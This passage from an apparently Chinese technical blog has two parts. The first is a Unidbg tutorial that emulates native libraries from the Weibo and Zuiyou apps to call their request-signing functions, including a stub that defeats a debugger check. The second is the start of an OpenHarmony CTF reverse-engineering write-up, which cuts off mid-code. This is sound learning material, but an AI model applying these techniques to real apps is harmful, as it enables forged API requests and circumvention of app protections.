bd2bc591aa729a1013c277c01c98cbec7da5ad7778b2fad62b85ac29ca28ced588638c98d6b7df5a130203010001300d06092a864886f70d0101050500038181000ad4b4c4dec800bd8fd2991adfd70676fce8ba9692ae50475f60ec468d1b758a665e961a3aedbece9fd4d7ce9295cd83f5f19dc441a065689d9820faedbb7c4a4c4635f5ba1293f6da4b72ed32fb8795f736a20c95cda776402099054fccefb4a1a558664ab8d637288feceba9508aa907fc1fe2b1ae5a0dec954ed831c0bea4&quot;) was called from RX@0x12011278[liboasiscore.so]0x11278JNIEnv-&gt;ReleaseStringUTFChars(&quot;30820295308201fea00302010202044b4ef1bf300d06092a864886f70d010105050030818d310b300906035504061302434e3110300e060355040813074265694a696e673110300e060355040713074265694a696e67312c302a060355040a132353696e612e436f6d20546563686e6f6c6f677920284368696e612920436f2e204c7464312c302a060355040b132353696e612e436f6d20546563686e6f6c6f677920284368696e612920436f2e204c74643020170d3130303131343130323831355a180f32303630303130323130323831355a30818d310b300906035504061302434e3110300e060355040813074265694a696e673110300e060355040713074265694a696e67312c302a060355040a132353696e612e436f6d20546563686e6f6c6f677920284368696e612920436f2e204c7464312c302a060355040b132353696e612e436f6d20546563686e6f6c6f677920284368696e612920436f2e204c746430819f300d06092a864886f70d010101050003818d00308189028181009d367115bc206c86c237bb56c8e9033111889b5691f051b28d1aa8e42b66b7413657635b44786ea7e85d451a12a82a331fced99c48717922170b7fc9bc1040753c0d38b4cf2b22094b1df7c55705b0989441e75913a1a8bd2bc591aa729a1013c277c01c98cbec7da5ad7778b2fad62b85ac29ca28ced588638c98d6b7df5a130203010001300d06092a864886f70d0101050500038181000ad4b4c4dec800bd8fd2991adfd70676fce8ba9692ae50475f60ec468d1b758a665e961a3aedbece9fd4d7ce9295cd83f5f19dc441a065689d9820faedbb7c4a4c4635f5ba1293f6da4b72ed32fb8795f736a20c95cda776402099054fccefb4a1a558664ab8d637288feceba9508aa907fc1fe2b1ae5a0dec954ed831c0bea4&quot;) was called from RX@0x120112b0[liboasiscore.so]0x112b0JNIEnv-&gt;FindClass(com/weibo/xvideo/NativeApi) was called from RX@0x12011348[liboasiscore.so]0x11348JNIEnv-&gt;RegisterNatives(com/weibo/xvideo/NativeApi, RW@0x1205d100[liboasiscore.so]0x5d100, 4) was called from RX@0x120113e0[liboasiscore.so]0x113e0RegisterNative(com/weibo/xvideo/NativeApi, s([BZ)Ljava/lang/String;, RX@0x120116cc[liboasiscore.so]0x116cc)RegisterNative(com/weibo/xvideo/NativeApi, e(Ljava/lang/String;)Ljava/lang/String;, RX@0x12011af4[liboasiscore.so]0x11af4)RegisterNative(com/weibo/xvideo/NativeApi, d(Ljava/lang/String;)Ljava/lang/String;, RX@0x12011cd8[liboasiscore.so]0x11cd8)RegisterNative(com/weibo/xvideo/NativeApi, dg(Ljava/lang/String;Z)Ljava/lang/String;, RX@0x1201220c[liboasiscore.so]0x1220c)Find native function Java_com_weibo_xvideo_NativeApi_s =&gt; RX@0x120116cc[liboasiscore.so]0x116ccJNIEnv-&gt;GetByteArrayElements(false) =&gt; [B@5b8dfcc1 was called from RX@0x12011734[liboasiscore.so]0x11734JNIEnv-&gt;GetArrayLength([B@5b8dfcc1 =&gt; 272) was called from RX@0x1201174c[liboasiscore.so]0x1174cJNIEnv-&gt;NewStringUTF(&quot;1e3780f50056a3fea76b35592bfc3efc&quot;) was called from RX@0x1201191c[liboasiscore.so]0x1191cCall s result:1e3780f50056a3fea76b35592bfc3efc</code></pre><p>其中的<code>FindClass</code>、<code>GetStaticMethodID</code>、<code>GetMethodID</code>、<code>GetStringUtfChars</code>、<code>GetFieldID</code>、<code>GetObjectArrayElement</code>、<code>ReleaseStringUTFChars</code>、<code>RegisterNatives</code>、<code>GetArrayLength</code>、<code>NewStringUTF</code>是 Unidbg 直接可以处理的内容。</p><p>其中的<code>CallStaticObjectMethodV</code>、<code>CallObjectMethodV</code>、<code>GetObjectField</code>则由 AbstrctJNI 处理，比如下面这条</p><pre><code class="language-shell">JNIEnv-&gt;CallStaticObjectMethodV(class android/app/ActivityThread, currentApplication() =&gt; android.app.Application@3d680b5a) was called from RX@0x120126cc[liboasiscore.so]0x126cc</code></pre><p>而第二篇样本日志输出如下：</p><pre><code class="language-shell">Find native function Java_com_sina_weibo_security_WeiboSecurityUtils_calculateS =&gt; RX@0x12001e7d[libutility.so]0x1e7dJNIEnv-&gt;FindClass(android/content/ContextWrapper) was called from RX@0x12002c4f[libutility.so]0x2c4fJNIEnv-&gt;GetMethodID(android/content/ContextWrapper.getPackageManager()Landroid/content/pm/PackageManager;) =&gt; 0x53f2c391 was called from RX@0x12002c69[libutility.so]0x2c69JNIEnv-&gt;FindClass(android/content/pm/PackageManager) was called from RX@0x12002c79[libutility.so]0x2c79JNIEnv-&gt;CallObjectMethod(android.app.Application@60704c, getPackageManager() =&gt; android.content.pm.PackageManager@2805c96b) was called from RX@0x12002c8d[libutility.so]0x2c8dJNIEnv-&gt;FindClass(android/content/pm/PackageInfo) was called from RX@0x12002c9d[libutility.so]0x2c9dJNIEnv-&gt;GetMethodID(android/content/pm/PackageManager.getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;) =&gt; 0x3bca8377 was called from RX@0x12002cb5[libutility.so]0x2cb5JNIEnv-&gt;NewStringUTF(&quot;com.weico.international&quot;) was called from RX@0x12002cd1[libutility.so]0x2cd1JNIEnv-&gt;CallObjectMethod(android.content.pm.PackageManager@2805c96b, getPackageInfo(&quot;com.weico.international&quot;, 0x40) =&gt; android.content.pm.PackageInfo@5db250b4) was called from RX@0x12002ce1[libutility.so]0x2ce1JNIEnv-&gt;GetFieldID(android/content/pm/PackageInfo.signatures [Landroid/content/pm/Signature;) =&gt; 0x25f17218 was called from RX@0x12002d13[libutility.so]0x2d13JNIEnv-&gt;GetObjectField(android.content.pm.PackageInfo@5db250b4, signatures [Landroid/content/pm/Signature; =&gt; [android.content.pm.Signature@50b472aa]) was called from RX@0x12002d25[libutility.so]0x2d25JNIEnv-&gt;FindClass(android/content/pm/Signature) was called from RX@0x12002d35[libutility.so]0x2d35JNIEnv-&gt;GetMethodID(android/content/pm/Signature.toByteArray()[B) =&gt; 0x6a3e2031 was called from RX@0x12002d4d[libutility.so]0x2d4dJNIEnv-&gt;GetObjectArrayElement([android.content.pm.Signature@50b472aa], 0) =&gt; android.content.pm.Signature@50b472aa was called from RX@0x12002d61[libutility.so]0x2d61JNIEnv-&gt;CallObjectMethod(android.content.pm.Signature@50b472aa, toByteArray() =&gt; [B@4ac3c60d) was called from RX@0x12002d71[libutility.so]0x2d71WInlineHookFunction free = RW@0x12176000JNIEnv-&gt;GetStringUtfChars(&quot;CypCHG2kSlRkdvr2RG1QF8b2lCWXl7k7&quot;) was called from RX@0x12001eb3[libutility.so]0x1eb3JNIEnv-&gt;GetStringUtfChars(&quot;7926844437&quot;) was called from RX@0x12001ec1[libutility.so]0x1ec1JNIEnv-&gt;FindClass(java/lang/String) was called from RX@0x12001f33[libutility.so]0x1f33JNIEnv-&gt;GetMethodID(java/lang/String.&lt;init&gt;([BLjava/lang/String;)V) =&gt; 0x782c535e was called from RX@0x12001f4b[libutility.so]0x1f4bJNIEnv-&gt;NewByteArray(8) was called from RX@0x12001f61[libutility.so]0x1f61JNIEnv-&gt;SetByteArrayRegion([B@0x0000000000000000, 0, 8, RW@0x121d3010) was called from RX@0x12001f7f[libutility.so]0x1f7fJNIEnv-&gt;NewStringUTF(&quot;utf-8&quot;) was called from RX@0x12001f8f[libutility.so]0x1f8fJNIEnv-&gt;NewObject(class java/lang/String, &lt;init&gt;([B@0x3164356134306466, &quot;utf-8&quot;) =&gt; &quot;1d5a40df&quot;) was called from RX@0x12001f9f[libutility.so]0x1f9fWInlineHookFunction free = RW@0x121d3010WInlineHookFunction free = RW@0x121d4000JNIEnv-&gt;ReleaseStringUTFChars(&quot;7926844437&quot;) was called from RX@0x12001fbd[libutility.so]0x1fbdcall s result:1d5a40df</code></pre><p>样本通过 JNI 调用了获取签名的相关 JAVA 方法，AbstractJNI 替我们做了处理。</p><h4 id="5-3-基本规范"><a href="#5-3-基本规范" class="headerlink" title="5.3 基本规范"></a>5.3 基本规范</h4><p>回到最初的报错上</p><pre><code class="language-shell">JNIEnv-&gt;GetStringUtfChars(&quot;hello world&quot;) was called from RX@0x12066b07[libnet_crypto.so]0x66b07JNIEnv-&gt;ReleaseStringUTFChars(&quot;hello world&quot;) was called from RX@0x12066b23[libnet_crypto.so]0x66b23JNIEnv-&gt;FindClass(com/izuiyou/common/base/BaseApplication) was called from RX@0x1204da21[libnet_crypto.so]0x4da21JNIEnv-&gt;GetStaticMethodID(com/izuiyou/common/base/BaseApplication.getAppContext()Landroid/content/Context;) =&gt; 0x2157b33c was called from RX@0x1204da57[libnet_crypto.so]0x4da57[15:23:19 214]  WARN [com.github.unidbg.linux.ARM32SyscallHandler] (ARM32SyscallHandler:538) - handleInterrupt intno=2, NR=-452987556, svcNumber=0x170, PC=unidbg@0xfffe0794, LR=RX@0x1204db2f[libnet_crypto.so]0x4db2f, syscall=nulljava.lang.UnsupportedOperationException: com/izuiyou/common/base/BaseApplication-&gt;getAppContext()Landroid/content/Context;at com.github.unidbg.linux.android.dvm.AbstractJni.callStaticObjectMethodV(AbstractJni.java:504)at com.github.unidbg.linux.android.dvm.AbstractJni.callStaticObjectMethodV(AbstractJni.java:438)at com.github.unidbg.linux.android.dvm.DvmMethod.callStaticObjectMethodV(DvmMethod.java:59)at com.github.unidbg.linux.android.dvm.DalvikVM$113.handle(DalvikVM.java:1815)at com.github.unidbg.linux.ARM32SyscallHandler.hook(ARM32SyscallHandler.java:131)at com.github.unidbg.arm.backend.Unicorn2Backend$11.hook(Unicorn2Backend.java:352)at com.github.unidbg.arm.backend.unicorn.Unicorn$NewHook.onInterrupt(Unicorn.java:109)at com.github.unidbg.arm.backend.unicorn.Unicorn.emu_start(Native Method)at com.github.unidbg.arm.backend.unicorn.Unicorn.emu_start(Unicorn.java:312)at com.github.unidbg.arm.backend.Unicorn2Backend.emu_start(Unicorn2Backend.java:389)at com.github.unidbg.AbstractEmulator.emulate(AbstractEmulator.java:378)at com.github.unidbg.thread.Function32.run(Function32.java:39)at com.github.unidbg.thread.MainTask.dispatch(MainTask.java:19)at com.github.unidbg.thread.UniThreadDispatcher.run(UniThreadDispatcher.java:165)at com.github.unidbg.thread.UniThreadDispatcher.runMainForResult(UniThreadDispatcher.java:97)at com.github.unidbg.AbstractEmulator.runMainForResult(AbstractEmulator.java:341)at com.github.unidbg.arm.AbstractARMEmulator.eFunc(AbstractARMEmulator.java:255)at com.github.unidbg.Module.emulateFunction(Module.java:163)at com.github.unidbg.linux.android.dvm.DvmObject.callJniMethod(DvmObject.java:135)at com.github.unidbg.linux.android.dvm.DvmClass.callStaticJniMethodObject(DvmClass.java:316)at com.test2.TEST2.callSign(TEST2.java:47)at com.test2.TEST2.main(TEST2.java:58)</code></pre><p>函数签名是<code>com/izuiyou/common/base/BaseApplication-&gt;getAppContext()Landroid/content/Context;</code>根据抛出的异常，它来自<code>callStaticObjectMethodV</code>调用。</p><p>如何构造和补 Context 是一个特殊问题，下面这个构造方式在绝大多数情况下可行。</p><pre><code class="language-Java">DvmObject&lt;?&gt; context = vm.resolveClass(&quot;android/app/Application&quot;, vm.resolveClass(&quot;android/content/ContextWrapper&quot;, vm.resolveClass(&quot;android/content/Context&quot;))).newObject(null);</code></pre><p>但这里我们使用另一个方式构造，为什么要这么做，这是一个小坑，放后文讨论，请读者先忍耐一下。</p><pre><code class="language-Java">DvmObject&lt;?&gt; context = vm.resolveClass(&quot;cn/xiaochuankeji/tieba/AppController&quot;).newObject(null);</code></pre><p>接下来补环境，我们可以在 AbstractJNI 的 callStaticObjectMethodV 里添加对这个方法的处理，如下所示。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/1667975125845-da7b2d2b-94a4-4cd5-b8de-a900955e2ec4.png" alt="img"></p><p>但这么做不是好办法，如果想将自己写的 Unidbg 代码分享给他人，或迁移到其他设备上，就必须要把 AbstractJNI 一并转移，这有些麻烦。除此之外，我们补的也不一定特别好，放到 AbstractJNI 里会“污染”环境。更惯常的做法是让本类继承 AbstractJNI，在创建虚拟机时<code>vm.setJni</code>设置为当前类。</p><pre><code class="language-Java">public TEST2() &#123;        emulator = AndroidEmulatorBuilder                .for32Bit()                .addBackendFactory(new Unicorn2Factory(true))                .setProcessName(&quot;cn.xiaochuankeji.tieba&quot;)                .build();        Memory memory = emulator.getMemory();        memory.setLibraryResolver(new AndroidResolver(23));        vm = emulator.createDalvikVM(new File(&quot;unidbg-android\\src\\test\\java\\com\\test2\\right573.apk&quot;));        //设置 JNI        vm.setJni(this);        vm.setVerbose(true);        // 使用libandroid.so虚拟模块        new AndroidModule(emulator, vm).register(memory);        DalvikModule dm = vm.loadLibrary(&quot;net_crypto&quot;, true);        NetCrypto = vm.resolveClass(&quot;com.izuiyou.network.NetCrypto&quot;);        dm.callJNI_OnLoad(emulator);    &#125;</code></pre><p>然后本类里重写 callStaticObjectMethodV 方法，处理目标方法。</p><pre><code class="language-Java">@Overridepublic DvmObject&lt;?&gt; callStaticObjectMethodV(BaseVM vm, DvmClass dvmClass, String signature, VaList vaList) &#123;    switch (signature)&#123;        case &quot;com/izuiyou/common/base/BaseApplication-&gt;getAppContext()Landroid/content/Context;&quot;:&#123;            DvmObject&lt;?&gt; context = vm.resolveClass(&quot;cn/xiaochuankeji/tieba/AppController&quot;).newObject(null);            return context;        &#125;    &#125;    return super.callStaticObjectMethodV(vm, dvmClass, signature, vaList);&#125;</code></pre><p>这里要警惕张冠李戴，callStaticObjectMethodV 和 callStaticObjectMethod 是两个不同的 JNI 方法，不要混淆，更不要补错地方哭错坟。</p><p>在有些情况下，样本过于复杂，要处理的 JNI 调用太多，也可以创建一个单独的 JNI 处理类。</p><pre><code class="language-Java">package com.izuiyou;import com.github.unidbg.AndroidEmulator;import com.github.unidbg.linux.android.dvm.*;public class zuiYouJNI extends AbstractJni &#123;    private final AndroidEmulator emulator;    public zuiYouJNI(AndroidEmulator emulator)&#123;        this.emulator = emulator;    &#125;    &#125;</code></pre><p>在本类 setJNI 也对应改变。</p><pre><code class="language-Java">vm.setJni(new zuiYouJNI(emulator));</code></pre><h4 id="5-4-开始补环境"><a href="#5-4-开始补环境" class="headerlink" title="5.4 开始补环境"></a>5.4 开始补环境</h4><p>言归正传，处理完这个JNI调用</p><pre><code class="language-Java">package com.test2;import com.github.unidbg.AndroidEmulator;import com.github.unidbg.arm.backend.Unicorn2Factory;import com.github.unidbg.linux.android.AndroidEmulatorBuilder;import com.github.unidbg.linux.android.AndroidResolver;import com.github.unidbg.linux.android.dvm.*;import com.github.unidbg.memory.Memory;import com.github.unidbg.virtualmodule.android.AndroidModule;import java.io.File;import java.nio.charset.StandardCharsets;public class TEST2 extends AbstractJni &#123;    private final AndroidEmulator emulator;    private final DvmClass NetCrypto;    private final VM vm;    public TEST2() &#123;        emulator = AndroidEmulatorBuilder                .for32Bit()                .addBackendFactory(new Unicorn2Factory(true))                .setProcessName(&quot;cn.xiaochuankeji.tieba&quot;)                .build();        Memory memory = emulator.getMemory();        memory.setLibraryResolver(new AndroidResolver(23));        vm = emulator.createDalvikVM(new File(&quot;unidbg-android\\src\\test\\java\\com\\test2\\right573.apk&quot;));        //设置 JNI        vm.setJni(this);        vm.setVerbose(true);        // 使用libandroid.so虚拟模块        new AndroidModule(emulator, vm).register(memory);        DalvikModule dm = vm.loadLibrary(&quot;net_crypto&quot;, true);        NetCrypto = vm.resolveClass(&quot;com.izuiyou.network.NetCrypto&quot;);        dm.callJNI_OnLoad(emulator);    &#125;    public String callSign() &#123;        String arg1 = &quot;hello world&quot;;        byte[] arg2 = &quot;V I 50&quot;.getBytes(StandardCharsets.UTF_8);        String ret = null;        try &#123;            ret = NetCrypto.callStaticJniMethodObject(emulator, &quot;sign(Ljava/lang/String;[B)Ljava/lang/String;&quot;, arg1, arg2).getValue().toString();        &#125; catch (Exception e) &#123;            e.printStackTrace();        &#125;        return ret;    &#125;    @Override    public DvmObject&lt;?&gt; callStaticObjectMethodV(BaseVM vm, DvmClass dvmClass, String signature, VaList vaList) &#123;        switch (signature) &#123;            case &quot;com/izuiyou/common/base/BaseApplication-&gt;getAppContext()Landroid/content/Context;&quot;: &#123;                DvmObject&lt;?&gt; context = vm.resolveClass(&quot;cn/xiaochuankeji/tieba/AppController&quot;).newObject(null);                return context;            &#125;        &#125;        return super.callStaticObjectMethodV(vm, dvmClass, signature, vaList);    &#125;    public static void main(String[] args) &#123;        TEST2 test = new TEST2();        String result = test.callSign();        System.out.println(&quot;call s result: &quot; + result);    &#125;&#125;</code></pre><p>继续运行，遇到了新的JNI 补环境。<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250705164702773.png" alt="image-20250705164702773"></p><p>获取包管理器如何返回？AbstractJNI 里有可供参考的代码。<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250705165040195.png" alt="image-20250705165040195"></p><p>重写，参考AbstractJNI 去补 PackageManager。</p><pre><code class="language-java">@Overridepublic DvmObject&lt;?&gt; callObjectMethodV(BaseVM vm, DvmObject&lt;?&gt; dvmObject, String signature, VaList vaList) &#123;    switch (signature)&#123;        case &quot;cn/xiaochuankeji/tieba/AppController-&gt;getPackageManager()Landroid/content/pm/PackageManager;&quot;:&#123;            return vm.resolveClass(&quot;android/content/pm/PackageManager&quot;).newObject(null);        &#125;    &#125;    return super.callObjectMethodV(vm, dvmObject, signature, vaList);</code></pre><p>继续运行<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250705165424673.png" alt="image-20250705165424673"></p><p>获取包名，AbstractJNI 里同样有这个处理逻辑。<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250705165455598.png" alt="image-20250705165455598"></p><p>照抄一下</p><pre><code class="language-Java">@Overridepublic DvmObject&lt;?&gt; callObjectMethodV(BaseVM vm, DvmObject&lt;?&gt; dvmObject, String signature, VaList vaList) &#123;    switch (signature)&#123;        case &quot;cn/xiaochuankeji/tieba/AppController-&gt;getPackageManager()Landroid/content/pm/PackageManager;&quot;:&#123;            return vm.resolveClass(&quot;android/content/pm/PackageManager&quot;).newObject(null);        &#125;        case &quot;cn/xiaochuankeji/tieba/AppController-&gt;getPackageName()Ljava/lang/String;&quot;:&#123;            String packageName = vm.getPackageName();            if (packageName != null) &#123;                return new StringObject(vm, packageName);            &#125;            break;        &#125;    &#125;    return super.callObjectMethodV(vm, dvmObject, signature, vaList);&#125;</code></pre><p>继续运行</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250705165811357.png" alt="image-20250705165811357"></p><p>在 AbstractJNI 里找 getClass 的处理逻辑。<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250705165854570.png" alt="image-20250705165854570"></p><p>照抄</p><pre><code class="language-Java">case &quot;cn/xiaochuankeji/tieba/AppController-&gt;getClass()Ljava/lang/Class;&quot;:&#123;    return dvmObject.getObjectType();&#125;</code></pre><p>继续运行<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250705170044840.png" alt="image-20250705170044840"></p><p>这在 AbstractJNI 里可没有，像下面这样处理，为什么这么做同样放到后面讨论。</p><pre><code class="language-Java">case &quot;java/lang/Class-&gt;getSimpleName()Ljava/lang/String;&quot;:&#123;    String className = ((DvmClass) dvmObject).getClassName();    String[] name = className.split(&quot;/&quot;);    return new StringObject(vm, name[name.length - 1]);&#125;</code></pre><p>继续运行<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250705170221889.png" alt="image-20250705170221889"></p><p>Context 的 getFilesDir 返回什么？像下面这样处理，为什么这么做放到后面讨论。</p><pre><code class="language-Java">case &quot;cn/xiaochuankeji/tieba/AppController-&gt;getFilesDir()Ljava/io/File;&quot;:&#123;    return vm.resolveClass(&quot;java/io/File&quot;).newObject(null);&#125;</code></pre><p>运行发现新报错<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250705170311740.png" alt="image-20250705170311740"></p><p>像下面这样补，为什么这么做放到后面讨论。</p><pre><code class="language-Java">case &quot;cn/xiaochuankeji/tieba/AppController-&gt;getFilesDir()Ljava/io/File;&quot;:&#123;    return vm.resolveClass(&quot;java/io/File&quot;).newObject(&quot;/data/data/cn.xiaochuankeji.tieba/files&quot;);&#125;case &quot;java/io/File-&gt;getAbsolutePath()Ljava/lang/String;&quot;:&#123;    return new StringObject(vm, dvmObject.getValue().toString());&#125;</code></pre><p>继续运行，走到了检测 debug 相关的逻辑<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250705170553628.png" alt="image-20250705170553628"></p><p>返回false</p><pre><code class="language-Java">@Overridepublic boolean callStaticBooleanMethodV(BaseVM vm, DvmClass dvmClass, String signature, VaList vaList) &#123;    switch (signature)&#123;        case &quot;android/os/Debug-&gt;isDebuggerConnected()Z&quot;:&#123;            return false;        &#125;    &#125;    return super.callStaticBooleanMethodV(vm, dvmClass, signature, vaList);&#125;</code></pre><p>继续运行，获取进程ID<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250705170703469.png" alt="image-20250705170703469"></p><p>返回Unidbg所生成的PID</p><pre><code class="language-Java">@Overridepublic int callStaticIntMethodV(BaseVM vm, DvmClass dvmClass, String signature, VaList vaList) &#123;    switch (signature)&#123;        case &quot;android/os/Process-&gt;myPid()I&quot;:&#123;            return emulator.getPid();        &#125;    &#125;    return super.callStaticIntMethodV(vm, dvmClass, signature, vaList);&#125;</code></pre><p>这里我们讨论一下pid的问题，不同的项目在此有不同的模拟思路。</p><p>比如qiling采用硬编码，返回0x512，即Unidbg环境里，进程的ID总是0x512.</p><pre><code class="language-python">def ql_syscall_getpid(ql: Qiling):    return 0x512</code></pre><p>ExAndroidNativeEmu 返回项目自身的 pid</p><pre><code class="language-python">def get_pid(self):    return os.getpid()</code></pre><p>Unidbg 同理，但它处理的更精细</p><pre><code class="language-Java">// 获取当前JVM进程的PIDString name = ManagementFactory.getRuntimeMXBean().getName();String pid = name.split(&quot;@&quot;)[0];// 解析为数字，取低 15 位this.pid = Integer.parseInt(pid) &amp; 0x7fff;</code></pre><p>它将获取到的进程 ID 和 0x7FFF 做与运算，按照与运算的规则，这舍去了高位，只保留较低的 15 比特。</p><p>原因在于，Linux 以及基于它的 Android 系统上，默认 PID 最大就是 0x8000（32768）。</p><pre><code>#define PID_MAX 0x8000</code></pre><p>可以在 adb shell 中验证这一点</p><pre><code>blueline:/ $ cat /proc/sys/kernel/pid_max32768blueline:/ $</code></pre><p>MacOS 上进程 ID 可达 100000，Windows 上更是不做限制。</p><p>这意味着，如果 Unidbg 的运行环境并非 Linux，而是 MacOS 或 Windows，那么获取到的 Pid 可能超出 Android 环境所限制的最大进程号。、</p><p>因此出于规范角度，Unidbg 抹去了当前 Pid 的高位，确保其小于<code>PID_MAX</code>。</p><p>在 Unidbg 里 PID 是私有的<code>final</code>变量，如果你想修改 PID，需要修改位于<code>unidbg-api/src/main/java/com/github/unidbg/AbstractEmulator.java</code> 的源码，这其实不是很方便，固定 pid 的需求其实也很多，如果 Unidbg 提供一个<code>setPid</code>的方法会很好.</p><p>运行测试，得到结果，符合我们的预期。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250705171217271.png" alt="image-20250705171217271"></p><pre><code class="language-shell">call s result:v2-b94195d5f3c2ad3a876f13346fa283a0</code></pre><h3 id="六、尾声"><a href="#六、尾声" class="headerlink" title="六、尾声"></a>六、尾声</h3><p>读者可能有很多困惑，在补环境的处理中留了不少坑，这应该也让大家意识到，补 JNI 环境是一个硬骨头，需要学习一番才能搞定。从下一篇开始，我们正式讨论如何补 JNI 环境。</p><h3 id="七、参考"><a href="#七、参考" class="headerlink" title="七、参考"></a>七、参考</h3><p><a href="https://www.yuque.com/lilac-2hqvv/xdwlsg/bmf8lm68ffvhrfu0#uMicr">Unidbg 的基本使用（三）</a></p>]]></content>
      
      
      <categories>
          
          <category> Unidbg学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Unidbg </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一届OpenHarmonyCTF</title>
      <link href="/2025/06/07/%E7%AC%AC%E4%B8%80%E5%B1%8AOpenHarmonyCTF/"/>
      <url>/2025/06/07/%E7%AC%AC%E4%B8%80%E5%B1%8AOpenHarmonyCTF/</url>
      
        <content type="html"><![CDATA[<h1 id="第一届OpenHarmonyCTF"><a href="#第一届OpenHarmonyCTF" class="headerlink" title="第一届OpenHarmonyCTF"></a>第一届OpenHarmonyCTF</h1><h3 id="easyre"><a href="#easyre" class="headerlink" title="easyre"></a>easyre</h3><p>签到题，但是由于用jdax反编译有很多方法都缺失了，所以在这推荐用一个在线反编译<br><a href="https://abcd.darknavy.org/dashboard">https://abcd.darknavy.org/dashboard</a></p><p>然后看idex，第一段的加密逻辑<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250607145121249.png" alt="image-20250607145121249"></p><p>就是加一个索引<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250607145217021.png" alt="image-20250607145217021"></p><pre><code class="language-python">enc = &quot;tlfr`llakodZbjW_aR&quot;enc_list = list(enc)for i in range(len(enc)):    enc_list[i] = ord(enc_list[i]) + len(enc_list)enc_list.reverse()for i in range(len(enc_list)):    enc_list[i] = chr(enc_list[i] - i)enc_list.reverse()for i in range(len(enc_list)):    print(enc_list[i], end=&quot;&quot;)</code></pre><p>第二段flag</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250607150129996.png" alt="image-20250607150129996"></p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250607150145465.png" alt="image-20250607150145465"></p><p>utils包里</p><pre><code class="language-javascript">// .abcD 2025-06-07T06:48:21.757851061// &amp;entry/src/main/ets/utils/Coder&amp;import util_ from &#39;@ohos:util.mjs&#39;;let decodeToString, encode; /* export */let r15;var x_1_1, x_1_2, x_1_3, x_1_4, x_1_5, x_1_6, x_1_7, x_1_8, x_1_9, x_1_10;x_1_9 = new.target;x_1_10 = this;const r0 = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#39;;x_1_4 = new Array(64);x_1_3 = new Array(64);x_1_6 = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 62, 0, 62, 0, 63, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0, 0, 0, 0, 0, 0, 0, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 0, 0, 0, 0, 63, 0, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51];x_1_5 = [0, 2, 1];r15 = 0;while (true) &#123;  if (r15 &gt;= r0.length) &#123;    x_1_4[62] = 43;    x_1_4[63] = 47;    x_1_3[62] = 45;    x_1_3[63] = 95;    x_1_6[43] = 62;    x_1_6[45] = 62;    x_1_6[47] = 63;    x_1_6[95] = 63;    x_1_1 = function uint8ArrayToString(p1) &#123;      return new util_.TextDecoder().decodeToString(p1);    &#125;;    x_1_2 = function convertToUint8Array(p1) &#123;      if (typeof p1 !== &#39;string&#39;) &#123;        if (!(p1 instanceof globalThis.ArrayBuffer)) &#123;          if (!(p1 instanceof globalThis.Uint8Array)) &#123;            throw Error(&#39;Unsupported type&#39;);          &#125; else &#123;            return p1;          &#125;        &#125; else &#123;          return new globalThis.Uint8Array(p1);        &#125;      &#125; else &#123;        return new util_.TextEncoder().encodeInto(p1);      &#125;    &#125;;    x_1_7 = function convertToString(p1) &#123;      let r10, r19, r32, r33;      r10 = p1;      if (p1 instanceof globalThis.ArrayBuffer) &#123;        const r5 = new globalThis.Uint8Array(p1);        r10 = x_1_1(r5);      &#125;      r19 = r10;      if (r10 instanceof globalThis.Uint8Array) &#123;        r19 = x_1_1(r10);      &#125;      if (typeof r19 != &#39;string&#39;) &#123;        throw Error(&#39;Unsupported type&#39;);      &#125; else &#123;        r32 = r19.length - 1;        r33 = &#39;&#39;;        while (true) &#123;          if (r32 &lt; 0) &#123;            return r33;          &#125; else &#123;            r32 = r32 - 1;            r33 = r33 + r19[r32];          &#125;        &#125;      &#125;    &#125;;    encode = function encode(p1, p2) &#123;      let r17, r28, r30, r39, r44, r58, r85, r86;      label_0: &#123;        const r1 = x_1_2(p1);        Math.ceil(r1.byteLength * 4 / 3);        if (p2 !== null) &#123;          if (p2 !== undefined) &#123;            r17 = p2.urlSafe;            break label_0;          &#125;        &#125;        r17 = undefined;      &#125;      const r19 = r17 === false;      if (!r19) &#123;        r30 = r19;      &#125; else &#123;        label_1: &#123;          if (p2 !== null) &#123;            if (p2 !== undefined) &#123;              r28 = p2.padding;              break label_1;            &#125;          &#125;          r28 = undefined;        &#125;        r30 = r28;      &#125;      label_2: &#123;        if (p2 !== null) &#123;          if (p2 !== undefined) &#123;            r39 = p2.urlSafe;            break label_2;          &#125;        &#125;        r39 = undefined;      &#125;      r44 = x_1_3;      if (r39 === false) &#123;        r44 = x_1_4;      &#125;      r58 = r9;      if (r30) 